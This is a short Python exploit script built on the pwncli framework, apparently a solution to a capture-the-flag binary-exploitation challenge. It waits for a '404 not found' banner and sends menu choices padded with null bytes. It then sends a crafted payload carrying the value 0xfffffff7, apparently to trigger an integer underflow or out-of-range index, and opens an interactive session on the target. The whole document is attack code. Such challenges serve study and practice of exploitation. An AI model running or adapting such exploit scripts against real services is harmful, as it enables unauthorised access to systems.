#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

p.recvuntil("#          404 not found")

p.send("1".ljust(0xa, "\x00"))


p.send('1'.ljust(0xf, "\x00"))

p.send((b"13\x00\x00" + b"a"*6 +p32(0xfffffff7)).ljust(0xf, b"\xff"))



p.interactive()